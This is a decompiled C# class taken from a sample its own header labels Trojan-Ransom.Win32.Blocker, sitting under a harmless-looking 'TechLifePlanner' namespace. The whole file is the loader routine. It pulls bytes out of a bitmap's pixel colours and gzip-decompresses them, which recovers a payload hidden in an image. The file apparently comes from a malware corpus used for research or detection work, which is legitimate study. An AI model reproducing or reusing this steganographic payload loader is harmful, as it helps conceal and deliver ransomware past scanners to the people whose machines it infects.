// Decompiled with JetBrains decompiler
// Type: TechLifePlanner.BaseFunctions.FunctionC.CP
// Assembly: TechLifePlanner, Version=1.2.2.1, Culture=neutral, PublicKeyToken=null
// MVID: 712C5B30-E9BA-4249-B09C-3499B28655CB
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00080-msil\Trojan-Ransom.Win32.Blocker.blxe-1cf57eb8143c825ce27f9f6b11247f429bffee3db4a8b402c645dee7a32acee0.exe

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.IO.Compression;

namespace TechLifePlanner.BaseFunctions.FunctionC
{
  public class CP
  {
    [DebuggerNonUserCode]
    public CP()
    {
    }

    private static byte[] DCompress(byte[] iDat)
    {
      byte[] numArray1;
      try
      {
        byte[] numArray2 = (byte[]) null;
        using (MemoryStream destination = new MemoryStream())
        {
          using (MemoryStream memoryStream = new MemoryStream(iDat))
          {
            using (GZipStream source = new GZipStream((Stream) memoryStream, CompressionMode.Decompress))
              CP.CT((Stream) source, (Stream) destination);
          }
          numArray2 = destination.ToArray();
        }
        numArray1 = numArray2;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        numArray1 = (byte[]) null;
        ProjectData.ClearProjectError();
      }
      return numArray1;
    }

    public static byte[] ReversePixels(Bitmap data)
    {
      byte[] numArray;
      try
      {
        List<byte> byteList = new List<byte>();
        int num1 = checked (data.Width - 1);
        int x = 0;
        while (x <= num1)
        {
          int num2 = checked (data.Height - 1);
          int y = 0;
          while (y <= num2)
          {
            Color pixel = data.GetPixel(x, y);
            if (pixel != Color.FromArgb(0, 0, 0, 0))
            {
              byteList.Add(pixel.R);
              byteList.Add(pixel.G);
              byteList.Add(pixel.B);
            }
            checked { ++y; }
          }
          checked { ++x; }
        }
        numArray = CP.DCompress(byteList.ToArray());
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        numArray = (byte[]) null;
        ProjectData.ClearProjectError();
      }
      return numArray;
    }

    private static T ReAlign<T>(ref T tt, T val)
    {
      tt = val;
      return val;
    }

    private static void CT(Stream source, Stream destination)
    {
      byte[] buffer = new byte[2048];
      int tt;
      while (CP.ReAlign<int>(ref tt, source.Read(buffer, 0, buffer.Length)) > 0)
        destination.Write(buffer, 0, tt);
    }
  }
}
